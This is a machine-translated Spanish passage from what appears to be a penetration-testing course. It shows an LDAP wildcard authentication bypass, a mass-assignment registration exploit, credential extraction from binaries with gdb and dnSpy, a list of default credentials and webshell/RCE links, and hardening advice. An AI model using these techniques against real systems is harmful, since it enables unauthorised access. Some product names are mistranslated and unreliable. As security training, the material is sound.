Como `OpenLDAP` se ejecuta en el servidor, es seguro asumir que la aplicación web se ejecuta en el puerto `80` utiliza LDAP para la autenticación.

Intentar iniciar sesión con un carácter comodín (`*`) en los campos de nombre de usuario y contraseña otorga acceso al sistema, de manera efectiva `bypassing any authentication measures that had been implemented`. Esto es un `significant` problema de seguridad, ya que permite a cualquier persona con conocimiento de la vulnerabilidad `gain unauthorised access` al sistema y datos potencialmente sensibles.


# Vulnerabilidades de Asignación de Masa Web

---

Varios marcos ofrecen prácticas funciones de asignación masiva para disminuir la carga de trabajo para los desarrolladores. Debido a esto, los programadores pueden insertar directamente un conjunto completo de datos ingresados por el usuario desde un formulario en un objeto o base de datos. Esta característica se utiliza a menudo sin una lista blanca para proteger los campos de la entrada del usuario. Esta vulnerabilidad podría ser utilizada por un atacante para robar información confidencial o destruir datos.

La vulnerabilidad de asignación masiva web es un tipo de vulnerabilidad de seguridad donde los atacantes pueden modificar los atributos del modelo de una aplicación a través de los parámetros enviados al servidor. Al invertir el código, los atacantes pueden ver estos parámetros y al asignar valores a parámetros críticos sin protección durante la solicitud HTTP, pueden editar los datos de una base de datos y cambiar la funcionalidad prevista de una aplicación.

Ruby on Rails es un marco de aplicación web que es vulnerable a este tipo de ataque. El siguiente ejemplo muestra cómo los atacantes pueden explotar la vulnerabilidad de asignación masiva en Ruby on Rails. Suponiendo que tenemos un `User` modelo con los siguientes atributos:

Código: rubí

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

El modelo anterior especifica que solo el `username` y `email` se permite que los atributos sean asignados en masa. Sin embargo, los atacantes pueden modificar otros atributos manipulando los parámetros enviados al servidor. Supongamos que el servidor recibe los siguientes parámetros.

Código: javascript

```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

Aunque el `User` el modelo no establece explícitamente que el `admin` el atributo es accesible, el atacante aún puede cambiarlo porque está presente en los argumentos. Al evitar cualquier control de acceso que pueda estar en su lugar, el atacante puede enviar estos datos como parte de una solicitud POST al servidor para establecer un usuario con privilegios de administrador.

---

## Explotación de la Vulnerabilidad de Asignación de Masa

Supongamos que nos encontramos con la siguiente aplicación que presenta una aplicación web de Asset Manager. Supongamos también que el código fuente de la aplicación nos ha sido proporcionado. Completando el paso de registro, recibimos el mensaje `Success!!`, y podemos intentar iniciar sesión.

![pendiente](https://academy.hackthebox.com/storage/modules/113/mass_assignment/pending.png)

Después de iniciar sesión, recibimos el mensaje `Account is pending approval`. El administrador de esta aplicación web debe aprobar nuestro registro. Revisando el código python del `/opt/asset-manager/app.py` el archivo revela el siguiente fragmento.

Código: pitón

```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```

Podemos ver que la aplicación está comprobando si el valor `k` está establecido. En caso afirmativo, permite al usuario iniciar sesión. En el código a continuación, también podemos ver que si establecemos el `confirmed` parámetro durante el registro, luego se inserta `cond` como `True` y nos permite omitir el paso de verificación de registro.

Código: pitón

```python
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')
```

En ese caso, lo que deberíamos intentar es registrar a otro usuario e intentar configurar el `confirmed` parámetro a un valor aleatorio. Usando Burp Suite, podemos capturar la solicitud HTTP POST en el `/register` página y establecer los parámetros `username=new&password=test&confirmed=test`.

![mass_oculto](https://academy.hackthebox.com/storage/modules/113/mass_assignment/mass_hidden.png)

Ahora podemos intentar iniciar sesión en la aplicación utilizando el `new:test` credenciales.

![iniciar sesión](https://academy.hackthebox.com/storage/modules/113/mass_assignment/loggedin.png)

La vulnerabilidad de asignación masiva se explota con éxito y ahora estamos conectados a la aplicación web sin esperar a que el administrador apruebe nuestra solicitud de registro.

---

## Prevención

Para evitar este tipo de ataque, se debe asignar explícitamente los atributos para los campos permitidos, o utilizar métodos de lista blanca proporcionados por el marco para verificar los atributos que pueden asignarse en masa. El siguiente ejemplo muestra cómo usar parámetros fuertes en el `User` controlador.

Código: rubí

```ruby
class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  private

  def user_params
    params.require(:user).permit(:username, :email)
  end
end
```

En el ejemplo anterior, el `user_params` el método devuelve un nuevo hash que incluye solo el `username` y `email` atributos, ignorando cualquier entrada más que el cliente pueda haber enviado. Al hacer esto, nos aseguramos de que solo los atributos explícitamente permitidos se puedan cambiar mediante asignación masiva.


# Ataque de Aplicaciones Conectando a Servicios

---

Las aplicaciones que están conectadas a los servicios a menudo incluyen cadenas de conexión que pueden filtrarse si no están suficientemente protegidas. En los siguientes párrafos, pasaremos por el proceso de enumeración y explotación de aplicaciones que están conectadas a otros servicios para ampliar su funcionalidad. Esto puede ayudarnos a recopilar información y movernos lateralmente o escalar nuestros privilegios durante las pruebas de penetración.

---

## examen ejecutable ELF

El `octopus_checker` binario se encuentra en una máquina remota durante la prueba. Ejecutar la aplicación localmente revela que se conecta a instancias de base de datos para verificar que estén disponibles.

  Ataque de Aplicaciones Conectando a Servicios

```shell-session
vcrdcr@htb[/htb]$ ./octopus_checker 

Program had started..
Attempting Connection 
Connecting ... 

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
connected
```

El binario probablemente se conecta usando una cadena de conexión SQL que contiene credenciales. Usando herramientas como [PEDA](https://github.com/longld/peda) (Python Exploit Development Assistance for GDB) podemos examinar más a fondo el archivo. Esta es una extensión del estándar GNU Debugger (GDB), que se utiliza para depurar programas C y C++. GDB es una herramienta de línea de comandos que le permite pasar por el código, establecer puntos de interrupción y examinar y cambiar variables. Al ejecutar el siguiente comando podemos ejecutar el binario a través de él.

  Ataque de Aplicaciones Conectando a Servicios

```shell-session
vcrdcr@htb[/htb]$ gdb ./octopus_checker

GNU gdb (Debian 9.2-1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./octopus_checker...
(No debugging symbols found in ./octopus_checker)
```

Una vez que se carga el binario, establecemos el `disassembly-flavor` para definir el estilo de visualización del código, y procedemos a desmontar la función principal del programa.

Código: montaje

```assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

Dump of assembler code for function main:
   0x0000555555555456 <+0>:	endbr64 
   0x000055555555545a <+4>:	push   rbp
   0x000055555555545b <+5>:	mov    rbp,rsp
 
 <SNIP>
 
   0x0000555555555625 <+463>:	call   0x5555555551a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x000055555555562a <+468>:	mov    rdx,rax
   0x000055555555562d <+471>:	mov    rax,QWORD PTR [rip+0x299c]        # 0x555555557fd0
   0x0000555555555634 <+478>:	mov    rsi,rax
   0x0000555555555637 <+481>:	mov    rdi,rdx
   0x000055555555563a <+484>:	call   0x5555555551c0 <_ZNSolsEPFRSoS_E@plt>
   0x000055555555563f <+489>:	mov    rbx,QWORD PTR [rbp-0x4a8]
   0x0000555555555646 <+496>:	lea    rax,[rbp-0x4b7]
   0x000055555555564d <+503>:	mov    rdi,rax
   0x0000555555555650 <+506>:	call   0x555555555220 <_ZNSaIcEC1Ev@plt>
   0x0000555555555655 <+511>:	lea    rdx,[rbp-0x4b7]
   0x000055555555565c <+518>:	lea    rax,[rbp-0x4a0]
   0x0000555555555663 <+525>:	lea    rsi,[rip+0xa34]        # 0x55555555609e
   0x000055555555566a <+532>:	mov    rdi,rax
   0x000055555555566d <+535>:	call   0x5555555551f0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@plt>
   0x0000555555555672 <+540>:	lea    rax,[rbp-0x4a0]
   0x0000555555555679 <+547>:	mov    edx,0x2
   0x000055555555567e <+552>:	mov    rsi,rbx
   0x0000555555555681 <+555>:	mov    rdi,rax
   0x0000555555555684 <+558>:	call   0x555555555329 <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs>
   0x0000555555555689 <+563>:	lea    rax,[rbp-0x4a0]
   0x0000555555555690 <+570>:	mov    rdi,rax
   0x0000555555555693 <+573>:	call   0x555555555160 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt>
   0x0000555555555698 <+578>:	lea    rax,[rbp-0x4b7]
   0x000055555555569f <+585>:	mov    rdi,rax
   0x00005555555556a2 <+588>:	call   0x5555555551d0 <_ZNSaIcED1Ev@plt>
   0x00005555555556a7 <+593>:	cmp    WORD PTR [rbp-0x4b2],0x0

<SNIP>

   0x0000555555555761 <+779>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x0000555555555765 <+783>:	leave  
   0x0000555555555766 <+784>:	ret    
End of assembler dump.
```

Esto revela varias instrucciones de llamada que apuntan a direcciones que contienen cadenas. Parecen ser secciones de una cadena de conexión SQL, pero las secciones no están en orden, y la endianidad implica que el texto de la cadena se invierte. Endianness define el orden en que los bytes se leen en diferentes arquitecturas. Más abajo en la función, vemos una llamada a SQLDriverConnect.

Código: montaje

```assembly
   0x00005555555555ff <+425>:	mov    esi,0x0
   0x0000555555555604 <+430>:	mov    rdi,rax
   0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
   0x000055555555560c <+438>:	add    rsp,0x10
   0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
```

Agregar un punto de interrupción en esta dirección y ejecutar el programa una vez más, revela una cadena de conexión SQL en la dirección de registro RDX, que contiene las credenciales para una instancia de base de datos local.

Código: montaje

```assembly
gdb-peda$ b *0x5555555551b0

Breakpoint 1 at 0x5555555551b0


gdb-peda$ run

Starting program: /htb/rollout/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x0 
RCX: 0xfffffffd 
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')

<SNIP>
```

Además de intentar conectarse al servicio MS SQL, los probadores de penetración también pueden verificar si la contraseña es reutilizable de los usuarios de la misma red.

---

## examen de archivo DLL

Un archivo DLL es un `Dynamically Linked Library` y contiene código al que se llama desde otros programas mientras se ejecutan. El `MultimasterAPI.dll` binario se encuentra en una máquina remota durante el proceso de enumeración. El examen del archivo revela que este es un .Montaje neto.

  Ataque de Aplicaciones Conectando a Servicios

```powershell-session
C:\> Get-FileMetaData .\MultimasterAPI.dll

<SNIP>
M .NETFramework,Version=v4.6.1 TFrameworkDisplayName.NET Framework 4.6.1    api/getColleagues        ! htt
p://localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast
<SNIP>
```

Usando el depurador y .Editor de ensamblaje NET [dnspy](https://github.com/0xd4d/dnSpy), podemos ver el código fuente directamente. Esta herramienta permite leer, editar y depurar el código fuente de un .Ensamblaje NET (C# y Visual Basic). Inspección de `MultimasterAPI.Controllers` -> `ColleagueController` revela una cadena de conexión de base de datos que contiene la contraseña.

![dnspy_oculto](https://academy.hackthebox.com/storage/modules/113/apps_conn_to_services/dnspy_hidden.png)

Además de tratar de conectarse al servicio MS SQL, los ataques como la pulverización de contraseñas también se pueden utilizar para probar la seguridad de otros servicios.


# Otras Aplicaciones Notables

---

Aunque este módulo se centra en nueve aplicaciones específicas, todavía hay muchas diferentes que podemos encontrar en la naturaleza. He realizado grandes pruebas de penetración en las que terminé con un informe de EyeWitness de más de 500 páginas.

El módulo fue diseñado para enseñar una metodología que se puede aplicar a todas las demás aplicaciones que podamos encontrar. La lista de aplicaciones que cubrimos en este módulo cubre las funciones principales y la mayoría de los objetivos de la gran cantidad de aplicaciones individuales para aumentar la efectividad de sus evaluaciones internas y externas durante sus pruebas de penetración.

Cubrimos enumerar la red y crear una representación visual de las aplicaciones dentro de una red para garantizar la máxima cobertura. También cubrimos una variedad de formas en que podemos atacar aplicaciones comunes, desde huellas dactilares y descubrimientos hasta abusar de la funcionalidad incorporada y exploits públicos conocidos. El objetivo de las secciones de osTicket y GitLab no era solo enseñarle cómo enumerar y atacar estas aplicaciones específicas, sino también mostrar cómo los sistemas de venta de entradas de la mesa de soporte y las aplicaciones de repositorio de Git pueden producir frutos que pueden ser útiles en otros lugares durante un compromiso.

Una gran parte de las pruebas de penetración se está adaptando a lo desconocido. Algunos probadores pueden realizar algunos escaneos y desanimarse cuando no ven nada directamente explotable. Si podemos examinar nuestros datos de escaneo y filtrar todo el ruido, a menudo encontraremos cosas que los escáneres pierden, como una instancia de Tomcat con credenciales débiles o predeterminadas o un repositorio Git abierto que nos da una clave SSH o contraseña que podemos usar en otro lugar para obtener acceso. Tener una comprensión profunda de la metodología y la mentalidad necesarias lo hará exitoso, sin importar si la red de destino tiene WordPress y Tomcat o un sistema de tickets de soporte personalizado y un sistema de monitoreo de red como Nagios. Asegúrese de comprender las diversas técnicas que se enseñan para la huella de estas aplicaciones y la curiosidad de explorar una aplicación desconocida.Se encontrará con aplicaciones que no figuran en este módulo. Similar a lo que hice con la aplicación OSS de Nexus Repository en la sección de introducción, puede aplicar estos principios para encontrar problemas como credenciales predeterminadas y funcionalidad incorporada que conduce a la ejecución remota de código.

---

## Menciones Honoríficas

Dicho esto, aquí hay algunas otras aplicaciones que hemos encontrado durante las evaluaciones y vale la pena tener en cuenta:

|Aplicación|Información de Abuso|
|---|---|
|[Eje2](https://axis.apache.org/axis2/java/core/)|Esto puede ser abusado similar a Tomcat. A menudo lo veremos sentado encima de una instalación de Tomcat. Si no podemos obtener RCE a través de Tomcat, vale la pena verificar las credenciales de administrador débiles/predeterminadas en Axis2. Entonces podemos subir un [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) en forma de un archivo AAR (Archivo de servicio Axis2). También hay un Metasploit [módulo](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) eso puede ayudar con esto.|
|[Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server)|Websphere ha sufrido de muchos diferentes [vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) con los años. Además, si podemos iniciar sesión en la consola administrativa con credenciales predeterminadas, como `system:manager` podemos implementar un archivo WAR (similar a Tomcat) y ganar RCE a través de un shell web o shell inverso.|
|[Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch)|Elasticsearch también ha tenido una buena cantidad de vulnerabilidades. Aunque viejo, hemos visto [esto](https://www.exploit-db.com/exploits/36337) antes, en olvidados Elasticsearch se instala durante una evaluación para una gran empresa (e identificado dentro de 100s de las páginas de salida del informe EyeWitness). Aunque no es realista, la máquina Hack The Box [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) características Elasticsearch.|
|[Zabbix](https://en.wikipedia.org/wiki/Zabbix)|Zabbix es un sistema de código abierto y una solución de monitoreo de red que ha tenido bastantes [vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) descubierto como inyección SQL, omisión de autenticación, XSS almacenado, divulgación de contraseña LDAP y ejecución remota de código. Zabbix también tiene una funcionalidad incorporada que se puede abusar para obtener la ejecución remota de código. La caja HTB [Cremallera](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) muestra cómo usar la API de Zabbix para obtener RCE.|
|[Nagios](https://en.wikipedia.org/wiki/Nagios)|Nagios es otro sistema y producto de monitoreo de red. Nagios ha tenido una amplia variedad de problemas a lo largo de los años, incluida la ejecución remota de código, la escalada de privilegios de raíz, la inyección SQL, la inyección de código y el XSS almacenado. Si se encuentra con una instancia de Nagios, vale la pena buscar las credenciales predeterminadas `nagiosadmin:PASSW0RD` y tomar las huellas digitales de la versión.|
|[WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)|WebLogic es un servidor de aplicaciones Java EE. En el momento de escribir este artículo, se han reportado 190 [CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). Hay muchos exploits de RCE no autenticados desde 2007 hasta 2021, muchos de los cuales son vulnerabilidades de deserialización de Java.|
|Wikis/Intranets|Podemos encontrar Wikis internos (como MediaWiki), páginas de intranet personalizadas, SharePoint, etc. Vale la pena evaluar estas vulnerabilidades conocidas, pero también buscar si hay un repositorio de documentos. Nos hemos encontrado con muchas páginas de intranet (tanto personalizadas como de SharePoint) que tenían una funcionalidad de búsqueda que llevó a descubrir credenciales válidas.|
|[DotNetNuke](https://en.wikipedia.org/wiki/DNN_\(software\))|DotNetNuke (DNN) es un CMS de código abierto escrito en C# que utiliza el .Marco NET. Ha tenido algunos severos [problemas](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) con el tiempo, como el bypass de autenticación, el salto de directorio, el XSS almacenado, el bypass de carga de archivos y la descarga arbitraria de archivos.|
|[vCenter](https://en.wikipedia.org/wiki/VCenter)|vCenter a menudo está presente en grandes organizaciones para administrar múltiples instancias de ESXi. Vale la pena verificar credenciales débiles y vulnerabilidades como esta [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) que los escáneres como Nessus no captan. Esto [carga de archivos OVA no autenticados](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) la vulnerabilidad fue revelada a principios de 2021, y un PoC para [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) fue lanzado durante el desarrollo de este módulo. vCenter viene como un dispositivo Windows y Linux. Si obtenemos un shell en el dispositivo Windows, la escalada de privilegios es relativamente simple usando JuicyPotato o similar. ¡También hemos visto a vCenter ya ejecutándose como SYSTEM e incluso ejecutándose como administrador de dominio! Puede ser un gran punto de apoyo en el medio ambiente o ser una única fuente de compromiso.|

Una vez más, esta no es una lista exhaustiva, sino solo más ejemplos de las muchas cosas que podemos encontrar en una red corporativa. Como se muestra aquí, a menudo, una contraseña predeterminada y una funcionalidad incorporada son todo lo que necesitamos.


# Endurecimiento de Aplicaciones

---

El primer paso para cualquier organización debe ser crear un inventario detallado (y preciso) de aplicaciones de aplicaciones internas y externas. Esto se puede lograr de muchas maneras, y los equipos azules con un presupuesto podrían beneficiarse de herramientas de pentesting como Nmap y EyeWitness para ayudar en el proceso. Se pueden usar varias herramientas de código abierto y de pago para crear y mantener este inventario. ¡Sin saber lo que existe en el medio ambiente, no sabremos qué proteger! La creación de este inventario puede exponer instancias de "shadow IT" (o instalaciones no autorizadas), aplicaciones obsoletas que ya no son necesarias o incluso problemas como una versión de prueba de una herramienta que se convierte automáticamente a una versión gratuita (como Splunk cuando ya no requiere autenticación).

---

## Consejos Generales de Endurecimiento

Las aplicaciones discutidas en esta sección deben endurecerse para evitar el compromiso utilizando estas técnicas y otras. A continuación se presentan algunas medidas importantes que pueden ayudar a asegurar las implementaciones de WordPress, Drupal, Joomla, Tomcat, Jenkins, osTicket, GitLab, PRTG Network Monitor y Splunk en cualquier entorno.

- `Secure authentication`: Las aplicaciones deben hacer cumplir contraseñas seguras durante el registro y la configuración, y las contraseñas de cuentas administrativas predeterminadas deben cambiarse. Si es posible, las cuentas administrativas predeterminadas deben deshabilitarse, con nuevas cuentas administrativas personalizadas creadas. Algunas aplicaciones admiten inherentemente la autenticación 2FA, que debe ser obligatoria para al menos usuarios de nivel de administrador.
    
- `Access controls`: Se deben implementar mecanismos de control de acceso adecuados por aplicación. Por ejemplo, las páginas de inicio de sesión no deben ser accesibles desde la red externa a menos que haya una razón comercial válida para este acceso. Del mismo modo, los permisos de archivos y carpetas se pueden configurar para denegar cargas o implementaciones de aplicaciones.
    
- `Disable unsafe features`: Características como la edición de código PHP en WordPress se pueden desactivar para evitar la ejecución de código si el servidor está comprometido.
    
- `Regular updates`: Las solicitudes deben actualizarse regularmente y los parches suministrados por los proveedores deben aplicarse lo antes posible.
    
- `Backups`: Los administradores del sistema siempre deben configurar copias de seguridad de sitios web y bases de datos, lo que permite que la aplicación se restaure rápidamente en caso de un compromiso.
    
- `Security monitoring`: Hay varias herramientas y complementos que se pueden usar para monitorear el estado y varios problemas relacionados con la seguridad para nuestras aplicaciones. Otra opción es un Firewall de Aplicaciones Web (WAF). Si bien no es una bala de plata, un WAF puede ayudar a agregar una capa adicional de protección siempre que ya se hayan tomado todas las medidas anteriores.
    
- `LDAP integration with Active Directory`: La integración de aplicaciones con el inicio de sesión único de Active Directory puede aumentar la facilidad de acceso, proporcionar más funcionalidad de auditoría (especialmente si se sincroniza con Azure) y hacer que la administración de credenciales y cuentas de servicio sea más ágil. También disminuye el número de cuentas y contraseñas que un usuario tendrá que recordar y dar un control detallado sobre la política de contraseñas.
    

Cada aplicación que discutimos en este módulo (y más allá) debe seguir las pautas clave de endurecimiento, como habilitar la autenticación multifactor para administradores y usuarios siempre que sea posible, cambiar los nombres de cuenta de usuario de administrador predeterminados, limitar el número de administradores y cómo los administradores pueden acceder al sitio (es decir, no desde Internet abierto), hacer cumplir el principio de menor privilegio en toda la aplicación realice actualizaciones periódicas para abordar vulnerabilidades de seguridad, llevando copias de seguridad periódicas a una ubicación secundaria para poder recuperarse rápidamente en caso de un ataque e implemente herramientas de monitoreo de seguridad que puedan detectar y bloquear actividad maliciosa y contabilizar la fuerza bruta, entre otros ataques.

Finalmente, debemos tener cuidado con lo que exponemos a Internet. ¿Ese repositorio de GitLab realmente necesita ser público? ¿Nuestro sistema de venta de entradas debe ser accesible fuera de la red interna? Con estos controles implementados, tendremos una línea base sólida para aplicar a todas las aplicaciones independientemente de su función.

También debemos realizar verificaciones y actualizaciones periódicas de nuestro inventario de aplicaciones para asegurarnos de que no estamos exponiendo aplicaciones en la red interna o externa que ya no son necesarias o que tienen fallas de seguridad graves. Finalmente, realice evaluaciones periódicas para buscar vulnerabilidades de seguridad y configuraciones erróneas, así como exposición a datos confidenciales. Siga las recomendaciones de remediación incluidas en sus informes de pruebas de penetración y verifique periódicamente los mismos tipos de fallas descubiertas por sus probadores de penetración. Algunos podrían estar relacionados con el proceso, lo que requiere un cambio de mentalidad para que la organización se vuelva más consciente de la seguridad.

---

## Consejos de Endurecimiento Específicos de la Aplicación

Aunque los conceptos generales para el endurecimiento de aplicaciones se aplican a todas las aplicaciones que discutimos en este módulo y que encontraremos en el mundo real, podemos tomar algunas medidas más específicas. Aquí hay algunos:

|Aplicación|Categoría de Endurecimiento|Discusión|
|---|---|---|
|[WordPress](https://wordpress.org/support/article/hardening-wordpress/)|Monitoreo de seguridad|Utilice un complemento de seguridad como [WordFence](https://www.wordfence.com/) que incluye monitoreo de seguridad, bloqueo de actividades sospechosas, bloqueo de países, autenticación de dos factores y más|
|[Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)|Controles de acceso|Un plugin como [AdminExilio](https://extensions.joomla.org/extension/adminexile/) se puede usar para requerir una clave secreta para iniciar sesión en la página de administración de Joomla, como `http://joomla.inlanefreight.local/administrator?thisismysecretkey`|
|[Drupal](https://www.drupal.org/docs/security-in-drupal)|Controles de acceso|Desactivar, ocultar o mover el [página de inicio de sesión de administrador](https://www.drupal.org/docs/7/managing-users/hide-user-login)|
|[Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)|Controles de acceso|Limite el acceso a las aplicaciones Tomcat Manager y Host-Manager solo a localhost. Si estos deben exponerse externamente, aplique la lista blanca de IP y establezca una contraseña muy segura y un nombre de usuario no estándar.|
|[Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)|Controles de acceso|Configurar permisos usando el [Plugin de Estrategia de Autorización de Matrix](https://plugins.jenkins.io/matrix-auth)|
|[Salpicadura](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)|Actualizaciones periódicas|Asegúrese de cambiar la contraseña predeterminada y asegúrese de que Splunk tenga la licencia adecuada para hacer cumplir la autenticación|
|[Monitor de red PRTG](https://kb.paessler.com/en/topic/61108-what-security-features-does-prtg-include)|Autenticación segura|Asegúrese de mantenerse actualizado y cambiar la contraseña predeterminada de PRTG|
|osTicket|Controles de acceso|Limite el acceso desde Internet si es posible|
|[GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)|Autenticación segura|Hacer cumplir las restricciones de registro, como requerir la aprobación del administrador para nuevas suscripciones, configurar dominios permitidos y denegados|

---

## Conclusión

En este módulo, cubrimos un área crítica de pruebas de penetración: aplicaciones comunes. Las aplicaciones web presentan una enorme superficie de ataque y a menudo se pasan por alto. Durante una prueba de penetración externa, a menudo, la mayoría de nuestros objetivos son aplicaciones. Debemos entender cómo descubrir aplicaciones (y organizar nuestros datos de escaneo para procesarlos de manera eficiente), versiones de huella, descubrir vulnerabilidades conocidas y aprovechar la funcionalidad incorporada. A muchas organizaciones les va bien con el parche y la administración de vulnerabilidades, pero a menudo pasan por alto problemas como credenciales débiles para acceder a Tomcat Manager o una impresora con credenciales predeterminadas para la aplicación de administración web donde podemos obtener credenciales LDAP para usar como punto de apoyo en la red interna.Las tres evaluaciones de habilidades que siguen están destinadas a poner a prueba el proceso de descubrimiento y enumeración de aplicaciones.


